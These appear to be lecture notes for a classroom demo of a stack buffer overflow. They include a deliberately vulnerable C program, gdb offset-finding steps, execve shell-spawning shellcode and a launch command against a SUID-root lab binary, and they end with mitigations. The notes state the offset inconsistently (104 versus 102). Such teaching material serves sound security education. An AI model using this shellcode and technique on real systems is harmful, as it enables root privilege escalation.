0. Setup

  1. Start with 427hax container running
  2. Have Vim open to classic.c
  3. Have Docker loaded and gdb running
  4. Keynote up and ready

1. Intro: keynote pres on exploits in OS zooming in

2. Preliminaries

  1. Describe the address space layout: fig on board + gdb
  ```
  gdb-peda$ info proc mappings
  ```

3. Attack Example

  1. Code Review: classic.c
```C
#include <stdio.h>
#include <unistd.h>

int vuln() {
    char buf[80];
    int r;
    r = read(0, buf, 400);
    printf("\nRead %d bytes. buf is %s\n", r, buf);
    puts("No shell for you :(");
    return 0;
}

int main(int argc, char *argv[]) {
    printf("Try to exec /bin/sh");
    vuln();
    return 0;
}
```
    Key points: small buff (80 bytes) but large read (400
    bytes): clear overflow

    - Where does that go?

  2. Test! By input 400 A's

```
gdb-peda$ r < in400A.txt
```

  3. What happened?

    1. What is 0x41414141414141414141....? --- A in ASCII
    2. What is RSP?
    3. Why is RBP 0x4141...
    4. What operation did we segfault on? `ret`
    5. Why? went into kernel virtual address regions

  4. Fix it. How? Write a pattern to see where things are:

```
gdp-peda$ r < in400pattern.txt
```

  5. Find the pattern:
```
gdb-peda$ x/wx $rsp
0x7fffffffe508: 0x41413741

gdb-peda$ pattern_offset 0x41413741
1094793025 found at offset: 104
```
    We can see that the pattern allows us to identify that
    the RSP is 102 bytes from the beginning, so that is
    where we put our target location in the attack string.

  6. User a safe pattern to improv our execution;
```
gdb-peda$ r < in400safe.txt
```
    What happened? B was the offset of 102 and it now
    allowed the return to work.

  7. How bout we now do something useful with that? Shell
     code setup by exporting and finding location.

```
$ export PWN=`python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"'`
```

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
	char *ptr;

	if(argc < 3) {
		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
		exit(0);
	}
	ptr = getenv(argv[1]); /* get env var location */
	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
	printf("%s will be at %p\n", argv[1], ptr);
}
```
    Note: ENV is placed right before the stack region, this
    tells us where it is located at assuming the location is
    always the same.
```
$ ~/getenvaddr PWN ./classic
```

  8. Note that classic runs with SUID root, meaning
     privilege will be root when exploited

  9. Now we Launch!!!!!

```
(cat inShellCodeTarget.txt; cat) | stacksmash/classic
```

  10. What can we do to solve?

    1. Make the stack non-executable
    2. Add Canary
    3. Randomize stack location: enable stack and go

      - Enable randomization and show stack move


